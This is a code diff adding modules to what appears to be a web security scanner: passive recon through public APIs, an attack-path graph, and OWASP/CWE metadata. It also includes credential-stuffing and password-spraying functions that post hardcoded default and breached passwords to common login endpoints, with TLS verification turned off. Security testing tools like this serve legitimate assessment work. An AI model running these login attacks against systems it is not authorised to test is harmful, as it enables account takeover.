+            r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+            alt_svc = r.headers.get("alt-svc","")
+            if "h2" in alt_svc or "h3" in alt_svc:
+                info(f"  HTTP/2: Alt-Svc header indicates h2/h3 support: {alt_svc}")
+    except ImportError:
+        # httpx not available, check via headers
+        try:
+            r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+            alt_svc = r.headers.get("alt-svc","")
+            if "h2" in alt_svc:
+                add("http2_attack", {
+                    "type": "HTTP/2 Supported (httpx needed for deep test)",
+                    "severity": "Info",
+                    "url": url,
+                    "detail": f"Server advertises HTTP/2 via Alt-Svc: {alt_svc}. Install httpx for deeper HTTP/2 testing.",
+                    "remediation": "pip install httpx[http2]",
+                })
+                found = True
+        except Exception:
+            pass
+    except Exception as _e:
+        warn(f"HTTP/2 scan error: {_e}")
+
+    if not found:
+        good("HTTP/2: No critical HTTP/2 vulnerabilities found")
+    _module_done("http2_attack")
+
+
+# ═══ MODULE 144 — PASSIVE RECON MODE (v15.0) ══════════════════════
+def passive_recon_scan(url):
+    """MODULE 144 — Passive reconnaissance (no active scanning of target)."""
+    if _module_skip("passive_recon"):
+        info("Skipping Passive Recon (already done)"); return
+    section("MODULE 144 — PASSIVE RECONNAISSANCE (No Active Scan)","🔭")
+    parsed = _up(url)
+    host   = parsed.netloc.split(":")[0]
+    parts  = host.split(".")
+    domain = ".".join(parts[-2:]) if len(parts)>1 else host
+    found  = False
+
+    # 1. Shodan-style: Check URLScan.io for past scans
+    try:
+        r = SESSION.get(f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=5",
+                       timeout=10, verify=False)
+        if r.status_code == 200:
+            data = json.loads(r.text)
+            results = data.get("results",[])
+            if results:
+                screenshots = [r_.get("screenshot","") for r_ in results[:3]]
+                tech = []
+                for r_ in results:
+                    page = r_.get("page",{})
+                    tech.extend(page.get("domain","").split())
+                info(f"  Passive: URLScan found {len(results)} past scans of {domain}")
+                add("passive_recon", {
+                    "type": "URLScan.io Intelligence",
+                    "severity": "Info",
+                    "url": f"https://urlscan.io/search/#domain:{domain}",
+                    "domain": domain,
+                    "past_scans": len(results),
+                    "detail": f"URLScan.io has {len(results)} historical scans of {domain} — screenshots and technology stack available",
+                    "remediation": "Review URLScan.io data to understand what attackers can learn passively.",
+                })
+                found = True
+    except Exception:
+        pass
+
+    # 2. HackerTarget.com passive DNS
+    try:
+        r = SESSION.get(f"https://api.hackertarget.com/hostsearch/?q={domain}",
+                       timeout=10, verify=False)
+        if r.status_code == 200 and r.text and "error" not in r.text.lower()[:20]:
+            hosts = [l.split(",")[0] for l in r.text.strip().split("\n") if "," in l]
+            if hosts:
+                info(f"  Passive: HackerTarget found {len(hosts)} hosts for {domain}")
+                add("passive_recon", {
+                    "type": "Passive DNS Intelligence",
+                    "severity": "Info",
+                    "url": f"https://api.hackertarget.com/hostsearch/?q={domain}",
+                    "domain": domain,
+                    "hosts_found": len(hosts),
+                    "sample": hosts[:10],
+                    "detail": f"Passive DNS reveals {len(hosts)} hosts for {domain}: {hosts[:5]}",
+                    "remediation": "No action needed — this is public DNS data. Secure any exposed hosts.",
+                })
+                found = True
+    except Exception:
+        pass
+
+    # 3. Web Archive / Wayback Machine — find old URLs
+    try:
+        wb_url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}&output=json&limit=50&fl=original&collapse=urlkey"
+        r = SESSION.get(wb_url, timeout=10, verify=False)
+        if r.status_code == 200:
+            try:
+                data = json.loads(r.text)
+                urls = [row[0] for row in data[1:] if row]  # Skip header row
+                # Find interesting historical URLs
+                interesting = [u for u in urls if any(
+                    kw in u for kw in ["/admin","/backup","/api","/config",
+                                       ".sql",".bak",".zip","/debug","/test"])]
+                if urls:
+                    info(f"  Passive: Wayback Machine has {len(urls)} URLs for {domain}")
+                    add("passive_recon", {
+                        "type": "Wayback Machine Intelligence",
+                        "severity": "Info" if not interesting else "Medium",
+                        "url": f"https://web.archive.org/web/*/{domain}",
+                        "domain": domain,
+                        "total_urls": len(urls),
+                        "interesting": interesting[:10],
+                        "detail": f"Wayback Machine has {len(urls)} archived URLs. Interesting: {interesting[:3]}",
+                        "remediation": "Test interesting historical URLs — decommissioned admin/backup pages may still work.",
+                    })
+                    if interesting:
+                        vuln(f"Wayback Machine: {len(interesting)} interesting historical URLs", "Medium")
+                    found = True
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    # 4. SecurityHeaders.io score (passive)
+    try:
+        r = SESSION.get(f"https://securityheaders.com/?q={url}&followRedirects=on&hide=on",
+                       timeout=10, verify=False)
+        if r.status_code == 200:
+            # Extract grade from response
+            grade_match = re.search(r'class="[^"]*grade[^"]*"[^>]*>([A-F][+-]?)</span>', r.text)
+            if grade_match:
+                grade = grade_match.group(1)
+                info(f"  Passive: SecurityHeaders.com grade: {grade}")
+                sev = "High" if grade in ("D","F") else "Medium" if grade in ("C","B-") else "Low"
+                add("passive_recon", {
+                    "type": f"Security Headers Grade: {grade}",
+                    "severity": sev,
+                    "url": f"https://securityheaders.com/?q={url}",
+                    "grade": grade,
+                    "detail": f"SecurityHeaders.com gives {url} a grade of '{grade}'",
+                    "remediation": "See SecurityHeaders.com report for missing security headers.",
+                })
+                if grade in ("D","F"):
+                    vuln(f"SecurityHeaders.com grade: {grade}", sev)
+                found = True
+    except Exception:
+        pass
+
+    if not found:
+        good("Passive Recon: Completed (passive APIs queried)")
+    _module_done("passive_recon")
+
+
+# ═══ ATTACK PATH GRAPH (v15.0) ════════════════════════════════════
+def _build_attack_path_graph(target, out_path):
+    """Build AI-style attack path visualization showing vuln chains."""
+    ts_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # Build attack path edges (which vulns enable which)
+    attack_chains = {
+        "xss":           {"leads_to": ["session_hijack","account_takeover","phishing"],
+                          "requires": [], "color": "#e74c3c"},
+        "sqli":          {"leads_to": ["data_exfil","auth_bypass","rce"],
+                          "requires": [], "color": "#c0392b"},
+        "ssrf":          {"leads_to": ["aws_imds","internal_scan","rce"],
+                          "requires": [], "color": "#e67e22"},
+        "aws_imds":      {"leads_to": ["cloud_takeover","s3_access"],
+                          "requires": ["ssrf"], "color": "#d35400"},
+        "cloud_storage": {"leads_to": ["data_exfil","credential_leak"],
+                          "requires": [], "color": "#e74c3c"},
+        "git_svn_deep":  {"leads_to": ["credential_leak","source_review","rce"],
+                          "requires": [], "color": "#8e44ad"},
+        "credential_leak":{"leads_to":["account_takeover","cloud_takeover"],
+                           "requires": [], "color": "#c0392b"},
+        "env_exposure":  {"leads_to": ["credential_leak","db_access","cloud_takeover"],
+                          "requires": [], "color": "#e74c3c"},
+        "jwt_confusion": {"leads_to": ["account_takeover","privilege_escalation"],
+                          "requires": [], "color": "#16a085"},
+        "oauth_oidc":    {"leads_to": ["account_takeover"],
+                          "requires": [], "color": "#16a085"},
+        "session_fix":   {"leads_to": ["account_takeover"],
+                          "requires": [], "color": "#27ae60"},
+        "ldap_inject":   {"leads_to": ["auth_bypass","data_exfil"],
+                          "requires": [], "color": "#2980b9"},
+        "deserial_deep": {"leads_to": ["rce","data_exfil"],
+                          "requires": [], "color": "#c0392b"},
+        "ssti_adv":      {"leads_to": ["rce","data_exfil"],
+                          "requires": [], "color": "#c0392b"},
+        "exposed_services":{"leads_to":["db_access","data_exfil","rce"],
+                            "requires": [], "color": "#e74c3c"},
+        "http_smuggling":{"leads_to": ["cache_poison","account_takeover","xss"],
+                          "requires": [], "color": "#8e44ad"},
+        "cache_poison":  {"leads_to": ["xss","phishing","account_takeover"],
+                          "requires": ["http_smuggling"], "color": "#9b59b6"},
+        "race_condition":{"leads_to": ["business_fraud","free_purchase"],
+                          "requires": [], "color": "#e67e22"},
+        "biz_logic_adv": {"leads_to": ["business_fraud","free_purchase"],
+                          "requires": [], "color": "#e67e22"},
+        "sub_takeover":  {"leads_to": ["phishing","xss","account_takeover"],
+                          "requires": [], "color": "#16a085"},
+        "nuclei":        {"leads_to": ["rce","data_exfil","account_takeover"],
+                          "requires": [], "color": "#e74c3c"},
+        "rfi":           {"leads_to": ["rce","data_exfil"],
+                          "requires": [], "color": "#c0392b"},
+    }
+
+    # Map impact nodes
+    impact_nodes = {
+        "rce":              {"label":"Remote Code\nExecution","color":"#c0392b","risk":10},
+        "account_takeover": {"label":"Account\nTakeover",    "color":"#e74c3c","risk":9},
+        "cloud_takeover":   {"label":"Full Cloud\nTakeover", "color":"#c0392b","risk":10},
+        "data_exfil":       {"label":"Data\nExfiltration",   "color":"#e74c3c","risk":9},
+        "credential_leak":  {"label":"Credential\nLeak",     "color":"#e67e22","risk":8},
+        "auth_bypass":      {"label":"Auth\nBypass",         "color":"#e67e22","risk":8},
+        "privilege_escalation":{"label":"Privilege\nEscalation","color":"#e67e22","risk":8},
+        "phishing":         {"label":"Phishing\nAttack",     "color":"#f39c12","risk":7},
+        "business_fraud":   {"label":"Business\nFraud",      "color":"#e67e22","risk":8},
+        "db_access":        {"label":"Database\nAccess",     "color":"#e74c3c","risk":9},
+        "s3_access":        {"label":"S3 Bucket\nAccess",    "color":"#e67e22","risk":7},
+        "source_review":    {"label":"Source Code\nReview",  "color":"#f39c12","risk":6},
+        "internal_scan":    {"label":"Internal\nNetwork",    "color":"#e67e22","risk":8},
+        "session_hijack":   {"label":"Session\nHijack",      "color":"#e74c3c","risk":9},
+        "cache_poison":     {"label":"Cache\nPoisoning",     "color":"#9b59b6","risk":7},
+        "free_purchase":    {"label":"Free\nPurchase",       "color":"#e67e22","risk":7},
+    }
+
+    # Find which attack chains are relevant to this scan
+    active_vulns  = {cat: data for cat, data in attack_chains.items()
+                     if cat in FINDINGS and FINDINGS[cat]}
+
+    # Build JS nodes/edges for D3-style visualization
+    nodes_js = []
+    edges_js = []
+    all_nodes = {}
+    node_id   = 0
+
+    # Add vulnerability nodes (found ones)
+    for cat, chain in active_vulns.items():
+        nid = f"vuln_{cat}"
+        emoji = CAT_TITLES.get(cat, ("⚠","",cat))[0]
+        label = CAT_TITLES.get(cat, ("","",cat))[1] or cat
+        # Count critical/high findings
+        items = FINDINGS.get(cat,[])
+        sevs  = [i.get("severity","") for i in items if isinstance(i,dict)]
+        is_critical = "Critical" in sevs
+        nodes_js.append(f"""{{id:"{nid}",label:"{emoji} {label}",
+            type:"vuln",color:"{chain['color']}",
+            critical:{"true" if is_critical else "false"},
+            count:{len(items)}}}""")
+        all_nodes[cat] = nid
+        node_id += 1
+
+    # Add impact nodes that are reachable
+    reachable_impacts = set()
+    for cat, chain in active_vulns.items():
+        for impact in chain["leads_to"]:
+            reachable_impacts.add(impact)
+
+    for impact in reachable_impacts:
+        if impact in impact_nodes:
+            nid = f"impact_{impact}"
+            idata = impact_nodes[impact]
+            nodes_js.append(f"""{{id:"{nid}",label:"{idata['label']}",
+                type:"impact",color:"{idata['color']}",risk:{idata['risk']}}}""")
+            all_nodes[impact] = nid
+
+    # Build edges
+    for cat, chain in active_vulns.items():
+        from_id = all_nodes.get(cat, f"vuln_{cat}")
+        for impact in chain["leads_to"]:
+            if impact in all_nodes:
+                edges_js.append(f"""{{from:"{from_id}",to:"{all_nodes[impact]}"}}""")
+        for req in chain["requires"]:
+            if req in active_vulns:
+                to_id = all_nodes.get(req, f"vuln_{req}")
+                edges_js.append(f"""{{from:"{all_nodes.get(req,to_id)}",to:"{from_id}",dashed:true}}""")
+
+    nodes_data = "[\n" + ",\n".join(nodes_js) + "\n]"
+    edges_data = "[\n" + ",\n".join(edges_js) + "\n]"
+
+    counts = _sev_counts()
+    score  = _risk_score()
+
+    html = f"""<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8"><title>Attack Path Graph</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/vis-network/9.1.6/vis-network.min.js"></script>
+<link  href="https://cdnjs.cloudflare.com/ajax/libs/vis-network/9.1.6/vis-network.min.css" rel="stylesheet">
+<style>
+*{{box-sizing:border-box;margin:0;padding:0}}
+body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3}}
+.hdr{{background:linear-gradient(135deg,#1a1a2e,#0f3460);padding:20px 30px;display:flex;justify-content:space-between;align-items:center}}
+.hdr h1{{font-size:1.3em;font-weight:300;letter-spacing:1px}}
+.stats{{display:flex;gap:12px}}
+.stat{{text-align:center;padding:8px 14px;background:rgba(255,255,255,.1);border-radius:6px}}
+.stat .n{{font-size:1.4em;font-weight:bold}}
+.stat .l{{font-size:.7em;opacity:.7}}
+#graph{{width:100%;height:calc(100vh - 80px);background:#0d1117}}
+.legend{{position:fixed;bottom:20px;left:20px;background:rgba(13,17,23,.9);
+         border:1px solid #30363d;border-radius:8px;padding:12px 16px}}
+.legend h3{{font-size:.8em;margin-bottom:8px;opacity:.7}}
+.leg-row{{display:flex;align-items:center;gap:8px;margin:4px 0;font-size:.8em}}
+.dot{{width:12px;height:12px;border-radius:50%}}
+.leg-dashed{{opacity:.6;font-style:italic}}
+</style></head><body>
+<div class="hdr">
+  <h1>⚔ ATTACK PATH GRAPH — {target}</h1>
+  <div class="stats">
+    <div class="stat"><div class="n" style="color:#c0392b">{counts.get("Critical",0)}</div><div class="l">Critical</div></div>
+    <div class="stat"><div class="n" style="color:#e67e22">{counts.get("High",0)}</div><div class="l">High</div></div>
+    <div class="stat"><div class="n" style="color:#f1c40f">{counts.get("Medium",0)}</div><div class="l">Medium</div></div>
+    <div class="stat"><div class="n">{score:.0f}</div><div class="l">Risk Score</div></div>
+    <div class="stat"><div class="n" style="color:#e74c3c">{len(active_vulns)}</div><div class="l">Attack Paths</div></div>
+  </div>
+</div>
+<div id="graph"></div>
+<div class="legend">
+  <h3>Legend</h3>
+  <div class="leg-row"><div class="dot" style="background:#c0392b"></div> Vulnerability (Critical)</div>
+  <div class="leg-row"><div class="dot" style="background:#e67e22"></div> Vulnerability (High)</div>
+  <div class="leg-row"><div class="dot" style="background:#2c3e50;border:2px solid #95a5a6"></div> Impact Node</div>
+  <div class="leg-row leg-dashed">- - → Requires (chain)</div>
+  <div class="leg-row">──→ Leads to (impact)</div>
+</div>
+<script>
+const nodes = new vis.DataSet({nodes_data});
+const edges = new vis.DataSet({edges_data});
+const container = document.getElementById("graph");
+const options = {{
+  nodes: {{
+    shape: "box",
+    font: {{color:"#e6edf3",size:12,face:"Segoe UI"}},
+    borderWidth: 2,
+    shadow: {{enabled:true,color:"rgba(0,0,0,0.5)",size:8}},
+    margin: 8,
+  }},
+  edges: {{
+    arrows: {{to:{{enabled:true,scaleFactor:0.7}}}},
+    color: {{color:"#58a6ff",opacity:0.8}},
+    width: 1.5,
+    smooth: {{type:"curvedCW",roundness:0.2}},
+  }},
+  physics: {{
+    enabled: true,
+    solver: "forceAtlas2Based",
+    forceAtlas2Based: {{gravitationalConstant:-60,springLength:150,springConstant:0.05}},
+    stabilization: {{iterations:150}},
+  }},
+  layout: {{improvedLayout:true}},
+  interaction: {{hover:true,zoomView:true,dragView:true}},
+}};
+// Style nodes by type
+nodes.forEach(function(n){{
+  if(n.type === "impact"){{
+    nodes.update({{id:n.id,shape:"diamond",size:20,
+      color:{{background:n.color,border:"#ffffff",highlight:{{background:n.color}}}}}});
+  }} else {{
+    nodes.update({{id:n.id,
+      color:{{background:n.critical?"#c0392b":"#1f2937",border:n.color,
+              highlight:{{background:n.color}}}},
+      borderWidth: n.critical?3:2}});
+  }}
+}});
+// Style dashed edges
+edges.forEach(function(e){{
+  if(e.dashed) edges.update({{id:e.id,dashes:true,color:{{color:"#8b949e"}}}});
+}});
+const network = new vis.Network(container, {{nodes,edges}}, options);
+network.on("click", function(p){{
+  if(p.nodes.length > 0){{
+    const n = nodes.get(p.nodes[0]);
+    alert(n.label.replace("\\n"," ") + "\\nType: " + (n.type==="impact"?"Impact Node":"Vulnerability\\nFindings: "+n.count));
+  }}
+}});
+</script>
+</body></html>"""
+
+    with open(out_path, "w", encoding="utf-8") as f:
+        f.write(html)
+    good(f"Attack Path Graph saved: {out_path}")
+
+
+# ═══ CREDENTIAL STUFFING SIMULATION (v15.0) ════════════════════════
+def credential_stuffing_sim(url, wordlist=None):
+    """Credential stuffing simulation using common leaked credentials."""
+    section("CREDENTIAL STUFFING SIMULATION","🔑")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Common leaked credential pairs (top breached passwords)
+    default_creds = [
+        ("admin","admin"),("admin","password"),("admin","admin123"),
+        ("admin","123456"),("admin","12345678"),("admin","password123"),
+        ("admin","letmein"),("admin","welcome"),("admin","monkey"),
+        ("admin","dragon"),("admin","master"),("admin","shadow"),
+        ("root","root"),("root","toor"),("root","password"),
+        ("user","user"),("user","password"),("user","12345"),
+        ("test","test"),("guest","guest"),("admin","qwerty"),
+        ("administrator","administrator"),("admin","changeme"),
+        ("admin","1qaz2wsx"),("admin","iloveyou"),("admin","trustno1"),
+    ]
+
+    if wordlist and os.path.isfile(wordlist):
+        try:
+            with open(wordlist) as f:
+                for line in f:
+                    parts = line.strip().split(":")
+                    if len(parts) == 2:
+                        default_creds.append((parts[0],parts[1]))
+        except Exception:
+            pass
+
+    login_paths = ["/login","/admin/login","/api/login","/auth",
+                   "/wp-login.php","/signin","/user/login","/account/login"]
+
+    success_signs = ["dashboard","logout","welcome","account","profile",
+                     "token","access_token","authenticated","success"]
+    fail_signs    = ["invalid","incorrect","failed","wrong","error",
+                     "try again","please check"]
+
+    found_logins = []
+    for path in login_paths:
+        ep = base + path
+        try:
+            r0 = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r0.status_code not in (200, 302, 405): continue
+        except Exception:
+            continue
+
+        info(f"  Stuffing: testing {ep} ({len(default_creds)} credential pairs)...")
+        for user, passwd in default_creds[:25]:  # Limit to avoid DoS
+            try:
+                # Check for rate limiting first
+                r = SESSION.post(ep, data={"username":user,"password":passwd,
+                                           "user":user,"pass":passwd,
+                                           "email":user,"login":user},
+                                 timeout=TIMEOUT, verify=False)
+                if r.status_code == 429:
+                    info(f"  Stuffing: rate limited at {ep} (good — rate limit works)")
+                    break
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in success_signs) and not any(s in resp_l for s in fail_signs):
+                    found_logins.append((ep, user, passwd))
+                    add("credential_stuff", {
+                        "type": "Default/Leaked Credentials Work",
+                        "severity": "Critical",
+                        "url": ep,
+                        "username": user,
+                        "password": passwd,
+                        "detail": f"Login at {ep} accepted credential pair {user}:{passwd} — default or leaked password!",
+                        "remediation": (
+                            "1. Change all default passwords immediately\n"
+                            "2. Implement multi-factor authentication\n"
+                            "3. Enable account lockout after N failed attempts\n"
+                            "4. Use HIBP API to check new passwords against breach database\n"
+                            "5. Implement CAPTCHA on login form"),
+                    })
+                    vuln(f"Default Credentials: {user}:{passwd} at {ep}", "Critical")
+            except Exception:
+                pass
+        if found_logins:
+            break  # Stop after first success
+
+    if not found_logins:
+        good("Credential Stuffing: No default credentials accepted")
+
+
+# ═══ PASSWORD SPRAYING SIMULATION (v15.0) ══════════════════════════
+def password_spray_sim(url):
+    """Password spraying simulation: common passwords × discovered usernames."""
+    section("PASSWORD SPRAYING SIMULATION","💦")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Common spray passwords (1 per account to avoid lockout)
+    spray_passwords = [
+        "Password1!","Welcome1!","Summer2024!","Winter2024!",
+        "Company1!","Hello123!","Qwerty123!","January2024!",
+        "Spring2024!","Admin2024!","User2024!","Test1234!",
+    ]
+
+    # Discovered usernames from other modules
+    discovered_users = set()
+    # From user enumeration in other modules
+    for cat in ["authn_bypass","login_brute","info_disclosure"]:
+        for item in FINDINGS.get(cat,[]):
+            if isinstance(item,dict) and "username" in item:
+                discovered_users.add(item["username"])
+    # Common usernames
+    discovered_users.update(["admin","administrator","root","user","test","guest","support","info"])
+
+    login_paths = ["/login","/api/login","/wp-login.php","/admin/login"]
+
+    for path in login_paths:
+        ep = base + path
+        try:
+            r0 = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r0.status_code not in (200, 302, 405): continue
+        except Exception:
+            continue
+
+        success_signs = ["dashboard","logout","token","welcome","account"]
+        info(f"  Spray: testing {ep} ({len(discovered_users)} users × 1 password)...")
+
+        for passwd in spray_passwords[:3]:  # Only 3 passwords to avoid lockout
+            for user in list(discovered_users)[:10]:
+                try:
+                    r = SESSION.post(ep,
+                                     data={"username":user,"password":passwd,"email":user},
+                                     timeout=TIMEOUT, verify=False)
+                    if r.status_code == 429:
+                        info(f"  Spray: rate limited at {ep}")
+                        return
+                    if any(s in r.text.lower() for s in success_signs):
+                        add("password_spray", {
+                            "type": "Password Spraying Success",
+                            "severity": "Critical",
+                            "url": ep,
+                            "username": user,
+                            "password": passwd,
+                            "detail": f"Password spraying: {user}:{passwd} succeeded at {ep}",
+                            "remediation": "Enable MFA. Use account lockout. Monitor failed login patterns.",
+                        })
+                        vuln(f"Password Spraying: {user}:{passwd} at {ep}", "Critical")
+                        return
+                except Exception:
+                    pass
+        break  # Only test first login endpoint
+
+    good("Password Spraying: No successful spray attack")
+
+
+
+# ═══════════════════════════════════════════════════════════════════
+# v15.0 — CAT_META ADDITIONS
+# ═══════════════════════════════════════════════════════════════════
+_V15_CAT_META = {
+    "http_smuggling": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-444 (Inconsistent Interpretation of HTTP Requests)",
+        "cvss": 9.0,
+        "biz": "Cache poisoning, ACL bypass, hijacking other users' requests",
+    },
+    "cache_poison": {
+        "owasp": "A05:2021 — Security Misconfiguration",
+        "cwe": "CWE-693 (Protection Mechanism Failure)",
+        "cvss": 8.1,
+        "biz": "Mass XSS, credential theft, defacement at CDN scale",
+    },
+    "websocket": {
+        "owasp": "A01:2021 — Broken Access Control",
+        "cwe": "CWE-346 (Origin Validation Error)",
+        "cvss": 8.0,
+        "biz": "Real-time data theft, impersonation, chat hijacking",
+    },
+    "race_condition": {
+        "owasp": "A04:2021 — Insecure Design",
+        "cwe": "CWE-362 (Race Condition)",
+        "cvss": 8.1,
+        "biz": "Free purchases, duplicate coupon redemption, financial fraud",
+    },
+    "mass_assign": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)",
+        "cvss": 8.8,
+        "biz": "Privilege escalation, account takeover, data integrity breach",
+    },
+    "hpp": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-235 (Improper Handling of Extra Parameters)",
+        "cvss": 5.3,
+        "biz": "Filter bypass, logic manipulation, WAF evasion",
+    },
+    "oauth_oidc": {
+        "owasp": "A07:2021 — Identification and Authentication Failures",
+        "cwe": "CWE-601 (URL Redirection to Untrusted Site)",
+        "cvss": 9.8,
+        "biz": "Account takeover, authorization code theft, impersonation",
+    },
+    "jwt_confusion": {
+        "owasp": "A02:2021 — Cryptographic Failures",
+        "cwe": "CWE-347 (Improper Verification of Cryptographic Signature)",
+        "cvss": 9.8,
+        "biz": "Full account takeover, privilege escalation, session forgery",
+    },
+    "sub_takeover": {
+        "owasp": "A05:2021 — Security Misconfiguration",
+        "cwe": "CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action)",
+        "cvss": 8.1,
+        "biz": "Phishing via trusted domain, malware distribution, XSS",
+    },
+    "email_inject": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-93 (Improper Neutralization of CRLF Sequences)",
+        "cvss": 5.3,
+        "biz": "Spam relay, phishing via trusted domain, reputation damage",
+    },
+    "cloud_storage": {
+        "owasp": "A05:2021 — Security Misconfiguration",
+        "cwe": "CWE-732 (Incorrect Permission Assignment for Critical Resource)",
+        "cvss": 9.8,
+        "biz": "Mass data breach, PII exposure, regulatory fines, ransomware staging",
+    },
+    "aws_imds": {
+        "owasp": "A10:2021 — Server-Side Request Forgery",
+        "cwe": "CWE-918 (Server-Side Request Forgery)",
+        "cvss": 10.0,
+        "biz": "Full AWS account takeover, cloud infrastructure compromise",
+    },
+    "cert_trans": {
+        "owasp": "A05:2021 — Security Misconfiguration",
+        "cwe": "CWE-200 (Exposure of Sensitive Information)",
+        "cvss": 5.3,
+        "biz": "Attack surface mapping, shadow IT discovery, targeted attacks",
+    },
+    "graphql_deep": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-285 (Improper Authorization)",
+        "cvss": 8.5,
+        "biz": "Schema enumeration, DoS amplification, data exfiltration",
+    },
+    "deserial_deep": {
+        "owasp": "A08:2021 — Software and Data Integrity Failures",
+        "cwe": "CWE-502 (Deserialization of Untrusted Data)",
+        "cvss": 9.8,
+        "biz": "Remote code execution, full server compromise",
+    },
+    "ssti_adv": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-94 (Code Injection)",
+        "cvss": 9.8,
+        "biz": "Remote code execution, data exfiltration, server compromise",
+    },
+    "dom_clobber": {
+        "owasp": "A03:2021 — Injection",
+        "cwe": "CWE-79 (Cross-Site Scripting)",
+        "cvss": 6.1,
+        "biz": "DOM manipulation, XSS via config override, session theft",
+    },
+    "redos": {
+        "owasp": "A06:2021 — Vulnerable and Outdated Components",
+        "cwe": "CWE-1333 (Inefficient Regular Expression Complexity)",
+        "cvss": 7.5,
+        "biz": "Application DoS with single request, service disruption",
+    },
+    "http2_attack": {
+        "owasp": "A05:2021 — Security Misconfiguration",
+        "cwe": "CWE-400 (Uncontrolled Resource Consumption)",
+        "cvss": 7.5,
+        "biz": "DDoS amplification, header injection, response splitting",
+    },
+    "passive_recon": {
+        "owasp": "A05:2021 — Security Misconfiguration",
+        "cwe": "CWE-200 (Exposure of Sensitive Information)",
+        "cvss": 5.3,
+        "biz": "Attack surface mapping, exposed infrastructure, targeted attacks",
+    },
+    "credential_stuff": {
+        "owasp": "A07:2021 — Identification and Authentication Failures",
+        "cwe": "CWE-307 (Improper Restriction of Excessive Authentication Attempts)",
+        "cvss": 9.8,
+        "biz": "Mass account takeover, data breach, financial fraud",
+    },
+    "password_spray": {
+        "owasp": "A07:2021 — Identification and Authentication Failures",
+        "cwe": "CWE-307 (Improper Restriction of Excessive Authentication Attempts)",
+        "cvss": 9.8,
+        "biz": "Account takeover, internal access, privilege escalation",
+    },
+}
+
+CAT_META.update(_V15_CAT_META)
+
+# ═══════════════════════════════════════════════════════════════════
+# v15.0 — CAT_TITLES ADDITIONS
+# ═══════════════════════════════════════════════════════════════════
+_V15_CAT_TITLES = {
+    "http_smuggling": ("📦", "HTTP", "HTTP Request Smuggling"),
+    "cache_poison":   ("🗑",  "Cache","Cache Poisoning"),
+    "websocket":      ("🔌", "WS",   "WebSocket Security"),
+    "race_condition": ("🏁", "Race", "Race Condition"),
+    "mass_assign":    ("📋", "Mass", "Mass Assignment"),
+    "hpp":            ("🔀", "HPP",  "HTTP Parameter Pollution"),
+    "oauth_oidc":     ("🔐", "OAuth","OAuth/OIDC Misconfiguration"),
+    "jwt_confusion":  ("🔑", "JWT",  "JWT Algorithm Confusion"),
+    "sub_takeover":   ("🌐", "SubTK","Subdomain Takeover"),
+    "email_inject":   ("✉",  "Email","Email Header Injection"),
+    "cloud_storage":  ("☁",  "Cloud","Cloud Storage Misconfiguration"),
+    "aws_imds":       ("☁",  "IMDS", "AWS IMDS SSRF"),
+    "cert_trans":     ("🔍", "CT",   "Certificate Transparency Recon"),
+    "graphql_deep":   ("⬡",  "GQL",  "GraphQL Deep Testing"),
+    "deserial_deep":  ("⚙",  "DSer", "Deserialization Detection"),
+    "ssti_adv":       ("🧮", "SSTI", "Advanced Template Injection"),
+    "dom_clobber":    ("🧱", "DOM",  "DOM Clobbering"),
+    "redos":          ("🐢", "ReDoS","ReDoS — Regex DoS"),
+    "http2_attack":   ("🚀", "HTTP2","HTTP/2 Attacks"),
+    "passive_recon":  ("🔭", "Recon","Passive Recon"),
+    "credential_stuff":("🔑","Cred", "Credential Stuffing"),
+    "password_spray": ("💦", "Spray","Password Spraying"),
+}
+
+CAT_TITLES.update(_V15_CAT_TITLES)
+
